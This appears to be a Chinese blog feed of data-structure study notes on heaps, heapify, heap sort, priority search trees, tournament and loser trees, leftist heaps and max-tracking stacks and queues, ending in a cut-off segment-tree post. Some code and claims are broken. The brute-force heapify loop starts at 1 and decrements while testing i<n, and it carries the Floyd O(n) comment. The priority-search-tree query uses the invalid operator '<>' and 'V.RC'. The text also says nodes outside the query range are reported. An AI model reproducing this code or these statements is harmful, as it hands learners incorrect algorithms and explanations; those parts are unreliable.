<p>根据堆的定义及调整规则，若新节点$p$通过上滤升高了k层，则意味着在$2^{k+1}$个随机节点($p$的父亲、$p$、以及$p$的$2^{k+1}-2$)中，该节点恰好为第二大者。</p>
<p>于是，若将新节点$p$累计上升的高度记作H,则H恰好为$k$的概率为:</p>
<p>$Pr(H=k)=1/2^{k+1}=(1/2)^k(1/2),0\leq k$</p>
<p>这是一个典型的几何分布，其数学期望为：</p>
<p>$E(h)=1/(1/2)-1=1$</p>
<p>每个节点经过上滤后平均上升1层，其间需做$1+1=2$次比较操作。</p>
<h2 id="建堆"><a href="#建堆" class="headerlink" title="建堆"></a>建堆</h2><p>很多算法中输入词条都是成批给出，故在初始化阶段往往需要解决一个共同问题:给定一组词条，高效地将他们组织为一个堆，这一过程称为建堆。</p>
<p><strong>蛮力算法</strong></p>
<p>从空堆开始，反复调用<code>insert()</code> 接口，即可将输入词条逐一插入其中，并最终完成建堆的任务。</p>
<p>若共有$n$个词条，则累计耗时量为：</p>
<p>$O(1)+O(2)+O(3)+…+O(n)=O(logn!)=O(nlogn)$</p>
<p>在$O(nlogn)$时间内可对所有词条全排序，但是在此只能提供一个偏序。</p>
<p><strong>自上而下的下滤</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> PQ_ComplHeap&lt;T&gt;::heapify ( Rank n ) &#123; <span class="comment">//Floyd建堆算法，O(n)时间</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = <span class="number">1</span>; i&lt;n; i-- ) <span class="comment">//自底而上，依次</span></span><br><span class="line">      percolateUp ( n, i ); <span class="comment">//下滤各内部节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>效率</strong></p>
<p>最坏情况下，每个节点都需要上滤至根，所需成本线性正比于其深度。即便只考虑底层，$n/2$个叶节点，深度均为$O(logn)$,累计耗时$O(nlogn)$，与蛮力算法一致。</p>
<p>考查高度为$h$，规模为$n=2^{h+1}-1$的满二叉树，其中深度为$i$的节点有$2^i$个，整个算法平均复杂度为：</p>
<p>$\sum_{i=1}^{n}(i2^i)=(h-1)2^{h+1}+2=(log_2(n+1)-2)(n+1)+2=O(nlogn)$ </p>
<p><strong>floyd算法</strong></p>
<p>给定任意堆$H_0$和$H_1$，以及节点$p$，将其转化为一个新堆，相当于以$p$为中介将堆$H_1$,$H_2$ 合并，故称为堆合并操作。</p>
<p>为满足结构性，可将这两个堆作为p的左、右子树，联接成一棵完整的二叉树。若p与孩子满足堆序性，则该二叉树为一个不折不扣的二叉堆。此时等效于在<code>delMax()</code>中摘除堆顶，再将末位词条转移至堆顶。只需对堆顶p实施下滤操作即可将全树转换为堆</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> PQ_ComplHeap&lt;T&gt;::heapify ( Rank n ) &#123; <span class="comment">//Floyd建堆算法，O(n)时间</span></span><br><span class="line">   <span class="keyword">for</span> ( <span class="keyword">int</span> i = LastInternal ( n ); InHeap ( n, i ); i-- ) <span class="comment">//自底而上，依次</span></span><br><span class="line">      percolateDown ( n, i ); <span class="comment">//下滤各内部节点</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>效率</strong></p>
<p>每个内部节点所需的调整时间，正比于其高度而非深度。</p>
<p>不失一般性，考查满树$n=2^{d+1}-1$</p>
<p>$S(n)=$所有节点的高度总和</p>
<p>$\sum_{i=0}^{d} (d-i)(2^i)=d \sum_{i=0}^{d}2^i-T(n)$</p>
<p>$=d(2^{d+1}-1)-[(d-1)2^{d+1}+2]=2^{d+1}-(d+2)=n-log_2(n+1)=O(n)$</p>
<p>同层内部节点下滤的次序，仅涉及到其各自的后代，它们之间完全相互独立，故改变次序不影响最终的结果。同时，每个节点下滤过程完全不变，所需时间不变，建堆所需的总体时间亦不变。</p>
<h1 id="具体应用"><a href="#具体应用" class="headerlink" title="具体应用"></a>具体应用</h1><h2 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h2><p>完全二叉堆的另一具体应用：对于向量中的n个词条，如何借助堆的相关算法，实现高效的排序。相应地，这类算法也称作堆排序算法。</p>
<p>算法总体思路和选择排序相同，将所有词条分为未排序和已排序，不断从前一类中取出最大者，顺序加至后一类中。算法启动之初，所有词条均属于前者，此后，后一类不断增长。当所有词条转入后一类时，即完成排序。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> Vector&lt;T&gt;::heapSort ( Rank lo, Rank hi ) &#123; <span class="comment">//0 &lt;= lo &lt; hi &lt;= size</span></span><br><span class="line">   <span class="function">PQ_ComplHeap&lt;T&gt; <span class="title">H</span> <span class="params">( _elem + lo, hi - lo )</span></span>; <span class="comment">//将待排序区间建成一个完全二叉堆，O(n)</span></span><br><span class="line">   <span class="keyword">while</span> ( ! H.empty() ) <span class="comment">//反复地摘除最大元并归入已排序的后缀，直至堆空</span></span><br><span class="line">      _elem[--hi] = H.delMax(); <span class="comment">//等效于堆顶与末元素对换后下滤</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里的待排序词条既然组织为向量，不妨将其划分为前缀H和与之互补的后缀S。整个算法过程中始终满足以下不变性：<strong>H中的最大词条不会大于S中的最小词条</strong>。与选择排序不同之处在于，无论S包含多少词条，都将组织为一个堆。</p>
<p>不需要全排序，查找前$k$个元素所需的时间为$O(klogn)$。</p>
<p><strong>效率</strong></p>
<p>就地堆排序易于理解，便于实现，快速高效(尤其对于大规模数据)。</p>
<p>可就地运转，不需要全排序即可找出前k个词条，但是在采取就地策略的同时，对换操作必须涉及两个完整的词条，所以操作的单位成本增加。</p>
<blockquote>
<p>以上堆排序算法是稳定的吗？</p>
</blockquote>
<p>不是稳定的，在反复摘除堆顶并将末词条转移至堆顶，然后下滤过程中，雷同词条之间的相对次序不再保持，故它们在最终所得的排序队列中必然是随机排列的。</p>
<p>以上堆排序是堆排序固有的不足，难以通过算法自身的调整予以改进。可通过合成数方法，使得原来相等的元素，初始位置越靠前，合成数越小。</p>
<h2 id="半无穷范围查询"><a href="#半无穷范围查询" class="headerlink" title="半无穷范围查询"></a>半无穷范围查询</h2><p>所谓半无穷范围查询简化之前的一般性范围查询，查询区域为某一侧无界的矩形区域，比如$R=[-1,+1] [0,+\infty]$ ，即对称地包含正半$y$坐标轴、宽度为$2$的一个广义矩形区域。同样为从某一固定的点集中找出落在制定区域$R$内的所有点。通过优先级搜索可将保持$O(r+logn)$的时间效率并将空间复杂度从范围树的$O(nlogn)$优化至$O(n)$。</p>
<p>优先级搜索树除了在拓扑上应是一棵二叉搜索树，还需同时遵守以下三条规则：</p>
<ul>
<li><p>首先，各个节点的$y$坐标不小于其左、右孩子(如果存在)</p>
<p>因此，整体上可视为以$y$为优先级的二叉堆</p>
</li>
<li><p>此外，相对于任一父节点，左子树中的节点$x$坐标均不得大于右子树中的节点</p>
</li>
<li><p>最后，互为兄弟的每一对左右子树，在规模上相差不得超过1</p>
<p>若无需遵守最后一条规则，则可保证所有节点以$x$坐标为序组成一棵二叉搜索树，该结构兼具二叉搜索树和堆的特性，故亦称为树堆。</p>
</li>
</ul>
<blockquote>
<p>试设计一个算法，在$O(nlogn)$时间内将平面上$n$个点组织为一棵优先级搜索树</p>
</blockquote>
<p>首先，不妨按照$x$坐标对所有点排序，然后根据以上定义，可以递归地将这些点组织为一棵优先级搜索树。</p>
<p>具体地，为了构造任一点集对应的子树，只需花费$O(n)$时间从中找到最高者($y$坐标最大者)。以下，借助$x$坐标的排序序列，可在$O(1)$时间内将剩余的$n-1$个点均平衡地划分为在空间上分列于左、右的两个子集–二者对应的子湖是可通过递归构造。</p>
<p>如此，构造全树的时间不超过:</p>
<p>$T(n)=2T(n/2)+O(n)=O(nlogn)$</p>
<blockquote>
<p>试设计一个算法，利用已经创建的优先级搜索树，在$O(r+logn)$时间内完成每次半无穷范围查询</p>
</blockquote>
<p>查询算法的大致过程可描述为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">queryPST(PSTNode v,SemInfRange R)&#123;</span><br><span class="line">     <span class="keyword">if</span>(!v||v.y&lt;R.y) <span class="keyword">return</span>;<span class="comment">//y-pruning</span></span><br><span class="line">     <span class="keyword">if</span>(R.x1&lt;v.x&amp;&amp;v.x&lt;R.x2) output(v);<span class="comment">//hit</span></span><br><span class="line">     <span class="keyword">if</span>(R.x1&lt;&gt;v.xm) queryPST(v.lc,R);<span class="comment">//recursion&amp;x-pruning</span></span><br><span class="line">     <span class="keyword">if</span>(v.xm&lt;=R.x2) queryPST(V.RC,R);<span class="comment">//recursion&amp;x-pruning</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>首先,根据$y$坐标，判断当前子树根节点$v$(及其后代)是否已经落在查询范围$R$之外。若是，则可立即在此处返回，不再进行递归—亦即纵向剪枝；否则，才需要继续深入查找。</p>
<p>以下，检查根节点$v$的$x$坐标，若落在查询范围之外，则需报告该节点。</p>
<p>最后，若在节点$v$处的横向切分位置为$xm$，则通过将其与$R$的左、右边界相比较，即可确认是否有必要继续沿对应的子树分支继续递归搜索–亦即横向剪枝。</p>
<p>唯有当$R.x1$不位于$v.xm$左侧时，才有必要对左子树$v.lc$做递归搜索，唯有当$R.x2$不位于$v.xm$左侧时，才有必要对右子树$v.rc$做递归搜索。</p>
<p>对任一查询区域$R=[R_1,R_2][y,+\infty]$ ,考查被算法<code>queryPST()</code>访问的任一节点，设与之对应的点为$v=(a,b)$，于是，$v$无非三种类型：</p>
<ol>
<li>被访问，且报告出来，也就是说，$v$落在$R$之内$(x_1 \leq a \leq x_2)$且$y\leq b$，此类节点恰有$r$个</li>
<li>虽被访问，但未报告，因其$x$坐标落在$R$之外$(a&lt;x_1)$或$(x_2&lt;a)$而横向剪枝，不再深入递归。此类节点在每一层上至多有两个，总数不超过$2O(logn)$</li>
<li>虽然被访问，但是未被报告，$x$坐标落在$R$之内$(x_1 \leq a \leq x_2)$,但是因为其$y$坐标却未落在$R$之内$(b&lt;y)$而纵向剪枝，此类节点的父节点必然属于1类或者2类，其总数不超过这两类节点总数的两倍。</li>
</ol>
<p>综合以上分析可知，<code>queryPST()</code>算法渐进的时间复杂度不超过$O(r+logn)$。</p>
<h2 id="锦标赛排序"><a href="#锦标赛排序" class="headerlink" title="锦标赛排序"></a>锦标赛排序</h2><p>堆排序中主要开销为建堆和删除堆顶元素，按照floyd算法，每次下滤可能在每一高度上均需要两次比较来从当前节点、当前节点的左、右孩子确定替换元素，所以在建堆过程中实际比较操作次数可能达到$2n$次，同理，删除堆顶元素并下滤恢复堆序性的过程中，堆的比较次数为$2logn$，以上两点均存在优化空间，所以引入了锦标赛排序，将前者比较操作次数降低至$n-1$次，后者比较操作次数降至$O(logn)$次。</p>
<p><strong>锦标赛树</strong></p>
<p>锦标赛树同样为二叉树，叶节点为待排序元素，以小者胜为原则，内部节点为孩子中的胜者，树根为全局冠军。内部节点之间存在重复，但是始终满足：<strong>在任一子树中，从根通往优胜者的沿途，所有节点都是优胜者</strong>。</p>
<p>由完全二叉树的性质，若存在$n$个叶节点，则内部节点为$n$个或者$n-1$个,取决于最后一个内部节点为一度还是二度。故节点总体空间不超过$2n$，空间复杂度为$O(n)$。</p>
<p>在每个内部节点处均需要一次比较，选出该节点左、右孩子中的胜者，所以构建锦标赛树所需的比较次数等于内部节点数目。所以构造锦标赛树的时间复杂度为$O(n)$。</p>
<p>插入/删除操作只需要更新沿着该叶节点到根节点的沿途节点，也即沿途胜者，总体时间复杂度为$O(logn)$。</p>
<p>由此设计锦标赛排序算法为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">create a tournament tree <span class="keyword">for</span> the input <span class="built_in">list</span></span><br><span class="line"><span class="keyword">while</span> there are active leaves</span><br><span class="line">   remove the root</span><br><span class="line">   retrace the root down to its leaf</span><br><span class="line">   deactive the leaf</span><br><span class="line">   replay along the path back to the root</span><br></pre></td></tr></table></figure>
<p>先花费$O(n)$时间建立锦标赛树，然后删除根节点，并沿原胜利者到根节点的路径找到原胜利者的叶节点，将原胜利者的叶节点优先级置为无穷大。最后从叶节点出发，逐层上溯至树根，重新确定各轮胜者，耗时$O(logn)$。上述删除和重赛迭代n次，故锦标赛排序的总体时间复杂度为$O(nlog n)$。</p>
<h2 id="败者树"><a href="#败者树" class="headerlink" title="败者树"></a>败者树</h2><p>由于在锦标赛树中，原冠军节点失效后，需要从该节点到根节点逐层上溯，重新确定各轮胜者，而重新确定胜者需要当前节点与其兄弟节点比较，但是其兄弟节点未必位于缓存中。除此之外，原来冠军已经失效，上溯过程中必然修改根节点到原来胜者所处叶节点沿途节点的值，均需要访存，所以引入败者树，父节点中不再保存胜者，而是保存败者。按照锦标赛排序算法，从根节点下行找到冠军叶节点，此时只访问该路径上的节点，所以具有时间局部性，可以更充分地利用缓存机制，在败者树更新过程中，各沿途节点未必需要更新，减少了写操作。</p>
<blockquote>
<p>锦标赛树可否实现稳定排序？</p>
</blockquote>
<p>可以，只需保证在相等元素比较时，位置靠前者胜出即可，得到地排序序列仍然可以保持相等元素之间的相对次序。</p>
<p>另外，可借助多叉锦标赛树实现多路合并。</p>
<h1 id="左式堆"><a href="#左式堆" class="headerlink" title="左式堆"></a>左式堆</h1><p>除了标准的插入和删除操作，堆结构在实际应用中的另一常见操作即为合并。任给堆A和B，如何将二者所含的词条组织为一个堆H。</p>
<p><strong>方法一</strong></p>
<p>反复地取出堆B的最大词条并插入堆A中，当堆B为空时，堆A即为所需的堆H,这一过程可描述为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(!B.empty())</span><br><span class="line">   A.insert(B.delmax());</span><br></pre></td></tr></table></figure>
<p>将两个堆的规模分别记作$n$和$m$,且$n\geq m$。每一步迭代均需做一次删除和一次插入操作。因共需$m$次迭代，故总体运行时间为：$m[O(logm)+log(n+m)]=O(mlog(n+m))=O(mlogn)$</p>
<p><strong>方法二</strong></p>
<p>将两个堆中的词条视为彼此独立的对象，直接借助floyd算法，将它们重新组织为一个新堆H,该方法的运行时间为：$O(n+m)$</p>
<p>实际上，既然所有词条已分成两组各自成堆，则意味着它们已经具有一定的偏序性，而一组相互独立的词条并不具有偏序性。由前者构建一个更大的偏序集，应该比后者简单。以上算法均未凑效的原因在于，不能保证合并操作涉及的节点足够少。</p>
<h2 id="单侧倾斜"><a href="#单侧倾斜" class="headerlink" title="单侧倾斜"></a>单侧倾斜</h2><p>左式堆是优先级队列的另一表现形式，可高效地支持合并操作。其基本思路是：在保持堆序性的前提下附加新的条件，使在堆的合并过程中，只需要调整很少量的节点。具体地，调整节点不超过$O(logn)$个，故可达到极高的效率。</p>
<p>左式堆的整体结构呈单侧倾斜状，其中节点均偏向于左侧，也就是说，左式堆不再如完全二叉堆一样满足结构性。实际上，结构性并非堆结构的本质要求。</p>
<h2 id="空节点路径长度"><a href="#空节点路径长度" class="headerlink" title="空节点路径长度"></a>空节点路径长度</h2><p>左式堆的倾斜度，应该控制在什么范围？又该如何控制？为此，借鉴红黑树和AVL树，未各节点引入空节点路径长苏，并依次确定相关算法的执行方向。</p>
<p>节点x的空节点路径长度(null path length)，记为$npl(x)$。若$x$为外部节点，则约定$npl(x)=npl(null)=0$。若x为内部节点，则$npl(x)$可递归地定义为：$npl(x)=1+min(npl(lc(x)),npl(rc(x)))$</p>
<p>也就是说，节点$x$的$npl$值取决于其左、右孩子$npl$值中的小者。</p>
<p><img src="https://i.loli.net/2019/09/09/VW6H38udDwe4G2F.png"></p>
<h2 id="左倾性"><a href="#左倾性" class="headerlink" title="左倾性"></a>左倾性</h2><p>左式堆是处处满足左倾性的二叉堆，即任一内部节点满足：</p>
<p>$npl(lc(x))\geq npl(rc(x))$</p>
<p>也就是说，就$npl$的指标而言，任一内部节点的左孩子都不小于其右孩子。</p>
<p>根据$npl$和左倾性的定义，左式堆中任一节点$x$都应满足：</p>
<p>$npl(x)=1+npl(rc(x))$</p>
<p>左式堆中每个节点的$npl$值，仅取决于其右孩子。</p>
<p>左孩子的$npl$值不小于右孩子并不意味着左孩子的高度必定不低于右孩子，因为一个节点的$npl$值由子树中最浅的叶子决定，高度则由最深的叶子决定。</p>
<h2 id="右侧链"><a href="#右侧链" class="headerlink" title="右侧链"></a>右侧链</h2><p>从节点$x$出发沿右侧分支一直前行至空节点，经过的通路称作其最右侧通路，记作rPath(x)。在左式堆中，每个节点的npl值恰好等于其最右侧通路的长度。</p>
<p>根节点r的最右侧通路<code>rPath(r)</code>的终点必然为全堆中深度最小的外部节点。若记：</p>
<p>$npl(r)=|rPath(x)|=d$</p>
<p>则该堆应包含一棵以$r$为根、高度为$d$的满二叉树，该二叉树至少应包含$2^{d}-1$个内部节点，$2^{d+1}-1$个外部节点。反之，在包含$n$个节点的左式堆中，最右侧通路$d\leq \lfloor log_2(n+1)-1 \rfloor =O(logn)$</p>
<h2 id="合并"><a href="#合并" class="headerlink" title="合并"></a>合并</h2><p>首先判断并处理待合并子堆为空的平凡情况，再通过一次比较，以及在必要时所做的一次交换，以保证堆顶a的优先级总是不低于另一堆顶$b$。</p>
<p>按照上述原理递归地将$a$的右子堆和堆$b$合并，并作为$a$的右子堆重新接入。递归返回后，还需比较$a$左、右孩子的npl值，如有必要还需令其互换，以保证前者不小于后者。此后只需在右孩子npl的基础上加1即可得到堆顶$a$的新npl值。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="comment">//根据相对优先级确定适宜的方式，合并以a和b为根节点的两个左式堆</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">BinNodePosi</span><span class="params">(T)</span> <span class="title">merge</span> <span class="params">( BinNodePosi(T) a, BinNodePosi(T) b )</span> </span>&#123;</span><br><span class="line">   <span class="keyword">if</span> ( ! a ) <span class="keyword">return</span> b; <span class="comment">//退化情况</span></span><br><span class="line">   <span class="keyword">if</span> ( ! b ) <span class="keyword">return</span> a; <span class="comment">//退化情况</span></span><br><span class="line">   <span class="keyword">if</span> ( lt ( a-&gt;data, b-&gt;data ) ) swap ( a, b ); <span class="comment">//一般情况：首先确保b不大</span></span><br><span class="line">   a-&gt;rc = merge ( a-&gt;rc, b ); <span class="comment">//将a的右子堆，与b合并</span></span><br><span class="line">   a-&gt;rc-&gt;parent = a; <span class="comment">//并更新父子关系</span></span><br><span class="line">   <span class="keyword">if</span> ( !a-&gt;lc || a-&gt;lc-&gt;npl &lt; a-&gt;rc-&gt;npl ) <span class="comment">//若有必要</span></span><br><span class="line">      swap ( a-&gt;lc, a-&gt;rc ); <span class="comment">//交换a的左、右子堆，以确保右子堆的npl不大</span></span><br><span class="line">   a-&gt;npl = a-&gt;rc ? a-&gt;rc-&gt;npl + <span class="number">1</span> : <span class="number">1</span>; <span class="comment">//更新a的npl</span></span><br><span class="line">   <span class="keyword">return</span> a; <span class="comment">//返回合并后的堆顶</span></span><br><span class="line">&#125; <span class="comment">//本算法只实现结构上的合并，堆的规模须由上层调用者负责更新</span></span><br></pre></td></tr></table></figure>
<p><strong>复杂度</strong></p>
<p>借助递归分析图不难看出，所有递归实例可排成一个线性序列，实质上属于线性递归，其运行时间正比于递归深度。递归只可能发生在两个待合并子树的最右侧通路上。若待合并堆的规模分别为$n$和$m$，则其两条最右侧通路的长度分别不会超过：</p>
<p>$O(logn)+O(logm)=O(logn+logm)=O(log (max(n,m))$</p>
<h2 id="删除-1"><a href="#删除-1" class="headerlink" title="删除"></a>删除</h2><p>基于merge操作实现<code>delMax()</code>算法，考查堆顶$x$及其子堆$H_L$和$H_R$。</p>
<p>在摘除x之后，$H_L$和$H_R$即可被视作为两个彼此独立待合并的堆。于是，只要通过<code>merge()</code>操作将它们合并起来，效果完全等效于常规的<code>delMax()</code>操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; T PQ_LeftHeap&lt;T&gt;::delMax() &#123; <span class="comment">//基于合并操作的词条删除算法（当前队列非空）</span></span><br><span class="line">   BinNodePosi(T) lHeap = _root-&gt;lc; <span class="comment">//左子堆</span></span><br><span class="line">   BinNodePosi(T) rHeap = _root-&gt;rc; <span class="comment">//右子堆</span></span><br><span class="line">   T e = _root-&gt;data; <span class="keyword">delete</span> _root; _size--; <span class="comment">//删除根节点</span></span><br><span class="line">   _root = merge ( lHeap, rHeap ); <span class="comment">//原左右子堆合并</span></span><br><span class="line"><span class="comment">//   if ( _root ) _root-&gt;parent = NULL; //若堆非空，还需相应设置父子链接</span></span><br><span class="line">   <span class="keyword">return</span> e; <span class="comment">//返回原根节点的数据项</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由合并操作的分析，时间成本总体依然不超过$O(log n)$</p>
<h2 id="插入-1"><a href="#插入-1" class="headerlink" title="插入"></a>插入</h2><p>若将词条$x$插入堆H中，只要将$x$视为一个仅含单个节点的堆，则调用<code>merge()</code>操作后，其效果等效于完成了一次词条插入操作。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt; <span class="keyword">void</span> PQ_LeftHeap&lt;T&gt;::insert ( T e ) &#123; <span class="comment">//基于合并操作的词条插入算法</span></span><br><span class="line">   BinNodePosi(T) v = <span class="keyword">new</span> BinNode&lt;T&gt; ( e ); <span class="comment">//为e创建一个二叉树节点</span></span><br><span class="line">   _root = merge ( _root, v ); <span class="comment">//通过合并完成新节点的插入</span></span><br><span class="line"><span class="comment">//   _root-&gt;parent = NULL; //既然此时堆非空，还需相应设置父子链接</span></span><br><span class="line">   _size++; <span class="comment">//更新规模</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>由合并操作的分析，时间成本总体依然不超过$O(log n)$</p>
<h1 id="栈堆-队堆"><a href="#栈堆-队堆" class="headerlink" title="栈堆/队堆"></a>栈堆/队堆</h1><p>为栈/队列提供在$O(1)$时间内访问最大值的接口，集成了栈/队列和堆属性的数据结构，称为栈堆(steap)/队堆(queap)。</p>
<h2 id="栈堆"><a href="#栈堆" class="headerlink" title="栈堆"></a>栈堆</h2><p>对于任何一个栈，可以引入另一个与之孪生的镜像P，P中的元素与S中的元素始终保持一一对应，前者的取值恰好是后者所有前驱中的最大者。当然P中元素必定按照单调非降的顺序排列。如此，任何时刻栈P的顶元素，都是栈S中的最大元素。为保持二者如上的对应关系，它们的push和pop必须同步进行。</p>
<p>若执行S.pop()，则只需同步地执行H.pop()，而若执行S.push(e),则需要同步地执行P.push(max(e,P.top()))。</p>
<p>以上方案还可以进一步优化。</p>
<p>可将栈P的空间进一步压缩，P中相等的元素必然彼此相邻，并因此可分为若干组。若假想式地令栈P中的每个元素通过指针指向栈S中的每个元素，而不是保留后者的副本，则可以将同组的元素合并起来，共享一个指针。当然，同时还需为合并后的元素增设一个计数器，记录原先同组元素的数目。如此改进之后，每一组元素只需保留以分，附加空间使用量可以大大降低。</p>
<p>相应地，在栈S每次执行出栈操作时，栈P必须同步地执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(--P.top().counter)) P.pop();</span><br></pre></td></tr></table></figure>
<p>而在栈S每次入栈时，栈P必须同步地执行</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P.top()&lt;e ? P.push(e),P.top.counter=<span class="number">1</span> :P.top().counter++;</span><br></pre></td></tr></table></figure>
<p>可见，S的<code>push()</code>和<code>pop()</code>接口，依然保持$O(1)$效率。</p>
<h2 id="队堆"><a href="#队堆" class="headerlink" title="队堆"></a>队堆</h2><p>上述关于栈的技巧同样可以推广至队列结构，可以引入一个双端队列P，并依然约定，其中每个元素也是始终指向队列Q中所有前驱的最大者。</p>
<p>为保持二者的对应关系，它们的<code>dequeue()</code>和<code>enqueue()</code>接口必须同步进行，若执行：<code>Q.dequeue()</code>,则需同步地执行<code>P.removeFront()</code>，而若执行<code>Q.enqueue()</code>，则只需同步地执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">P.insertRear(e);</span><br><span class="line"><span class="keyword">for</span>(x=P.rear();x&amp;(x.key&lt;=e);x=x.pred)&#123;</span><br><span class="line">  x.key=e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>除了首先令e加入队列P，还需要将P尾部所有不大于e的元素统一更新为e。在最坏情况下，这需要$\Omega(n)$时间，而这种情况可能持续发生。造成这一困难的原因在于，队列中任一元素的前驱集，不再如栈中那样是固定的，而是可能增加，且新增元素可能非常大。</p>
<p>同样，可仿照前一技巧，将队列P压缩。然后在队列每次执行出队操作时，队列P必须同步地执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(!(--P.front().counter)) P.removeFront();</span><br></pre></td></tr></table></figure>
<p>而在队列Q每次执行入队时，队列P同步地执行：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(!P.empty()&amp;&amp;(P.rear().key&lt;=e))</span><br><span class="line">   a+=P.removeRear().counter;<span class="comment">//当当前尾部元素不大于e时，累计计数器后删除该尾部元素</span></span><br><span class="line">P.insertRear(e);</span><br><span class="line">P.rear().counter=a;</span><br></pre></td></tr></table></figure>
<p>这里的while循环在最坏情况下仍然需要迭代$O(n)$步，但因为参与迭代的元素必然随即被删除，故就分摊意义而言仅为$O(1)$步，时间性能大为改善。</p>
<p>另外，这里的队列P并不需要双端队列的所有功能，<code>removeFront()</code>,<code>insertRear()</code>,<code>removeRear()</code>接口，无需使用<code>insertFront()</code>接口。</p>
]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>Data structure</tag>
      </tags>
  </entry>
  <entry>
    <title>线段树</title>
    <url>/algorithm/segement-tree/</url>
    <content><![CDATA[<p>与树状数组类似，线段树同样可以高效率对区间进行查询、更新操作。与树状数组不同的是，树状数组仅限于计算前缀和，应用问题存在很大的局限。所以通常用线段树来维护一系列区间操作，特别是区间最大值最小值问题。</p>
<a id="more"></a>

<p>表示区间[1, 10]的线段树表示如下： </p>
<p><img src="https://i.loli.net/2020/03/28/36OVUpCFsTiRI7b.png"></p>
<p>每个节点维护对应区间的信息,某节点的区间为其左右孩子节点区间之和。</p>
<h1 id="单点更新和区间查询"><a href="#单点更新和区间查询" class="headerlink" title="单点更新和区间查询"></a>单点更新和区间查询</h1><p>以下以结构体形式来构建线段树</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a[maxn]</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> l,r;</span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">    <span class="keyword">int</span> sum;</span><br><span class="line">&#125;;</span><br><span class="line">Node seg[maxn*<span class="number">3</span>];</span><br></pre></td></tr></table></figure>
<p>每个节点维护对应区间的最大值$val$，区间和$sum$，$l$为区间左端点，$r$为区间右端点。</p>
<p>可以证明得到，线段树节点总数不超过叶结点总数的2倍，线段树数组通常设置为维护数组(即叶结点对应的值)的3倍。</p>
<p>以求区间最值和求区间和为例，构建线段树的操作为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">build</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> l,<span class="keyword">int</span> r)</span></span>&#123;</span><br><span class="line">    seg[i].l=l;</span><br><span class="line">    seg[i].r=r;</span><br><span class="line">    <span class="keyword">if</span>(l==r)&#123;</span><br><span class="line">        seg[i].sum=a[l];</span><br><span class="line">        seg[i].val=a[l];</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    build(<span class="number">2</span>*i,l,mid);</span><br><span class="line">    build(<span class="number">2</span>*i+<span class="number">1</span>,mid+<span class="number">1</span>,r);</span><br><span class="line">    seg[i].val=min(seg[<span class="number">2</span>*i].val,seg[<span class="number">2</span>*i+<span class="number">1</span>].val);</span><br><span class="line">    seg[i].sum=seg[<span class="number">2</span>*i].sum+seg[<span class="number">2</span>*i+<span class="number">1</span>].sum;</span><br><span class="line">&#125;</span><br><span class="line">build(<span class="number">1</span>,<span class="number">1</span>,n);</span><br></pre></td></tr></table></figure>
<p>其中$i$为二叉线段树中节点的编号，$l$为区间左端点，$r$为区间右端点。节点$i$的左孩子为节点$2i$，节点$i$的右孩子为节点$2i+1$。</p>
<p>在构建节点左右子树后，再更新当前节点对应的区间最值和区间和。</p>
<p>更新线段树的操作为</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> k,<span class="keyword">int</span> x)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(seg[i].l==seg[i].r)&#123;</span><br><span class="line">        seg[i].val=x;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> mid=(seg[i].l+seg[i].r)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">if</span>(k&lt;=mid) update(<span class="number">2</span>*i,k,x);</span><br><span class="line">    <span class="keyword">else</span> update(<span class="number">2</span>*i+<span 